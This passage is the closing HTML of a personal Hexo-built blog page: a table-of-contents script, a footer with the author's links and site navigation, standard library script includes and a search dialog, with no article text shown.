    </div>
    <script>
        tocbot.init({
            // Where to render the table of contents.
            tocSelector: '#toc-content',
            // Where to grab the headings to build the table of contents.
            contentSelector: 'article',
            // Which headings to grab inside of the contentSelector element.
            headingSelector: 'h1, h2, h3',
            // For headings inside relative or absolute positioned containers within content.
            hasInnerContainers: true,
        });
    </script>


    


    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer id="footer">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
                <ul class="list-inline">
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    
                        <li class="list-inline-item">
                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    
                </ul>
                <ul class="copyright footer-menu list-inline">
                    
                    
                        <li class="list-inline-item">
                            
                            
                            <a href="/">
                                
                                    Home
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/archives">
                                
                                    Archives
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/tags">
                                
                                    Tags
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/categories">
                                
                                    Categories
                                
                            </a>
                        </li>
                    
                        <li class="list-inline-item">
                            
                                <span class="copyright-split">&nbsp;|&nbsp;</span>
                            
                            
                            <a href="/about">
                                
                                    About
                                
                            </a>
                        </li>
                    
                </ul>
                <p class="copyright footer-author">
                    &copy; -2024 
                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
                    
                    
                </p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    <!-- jQuery -->
<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>

<!-- For drop down -->
<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>

<!-- Bootstrap -->
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
<!-- Gallery -->
<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
<!-- Busuanzi -->


<!-- Search script -->

<script src="/js/search.js"></script>

<script type="text/javascript">
    $(function () {
        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
    });
</script>



<script src="/js/main.js"></script>



    <!-- Search Modal -->
    <!-- Modal -->
<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
        <div class="modal-content overflow-auto">
            <div class="modal-header">
                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <div id="searchResult">
                    <div class="search-empty text-center text-muted p-5">
                        <i class="far fa-meh"></i>
                    </div>
                </div>
            </div> 
        </div>
    </div>
</div>


</body>
</html>